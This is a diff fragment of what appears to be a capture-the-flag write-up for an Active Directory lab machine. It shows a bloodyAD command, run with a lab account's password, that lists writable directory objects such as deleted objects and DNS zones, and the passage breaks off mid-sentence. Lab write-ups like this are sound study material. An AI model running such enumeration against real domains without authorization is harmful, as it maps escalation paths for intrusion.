@@ -142,3 +142,31 @@ max.palmer
 
 Ill use `--rid-brute` to also get machine accounts
 
+# Writable objects as `alex.turner`
+
+```python
+❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable               
+
+distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
+DACL: WRITE
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Employees,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+```
+
+Some things here are default, but
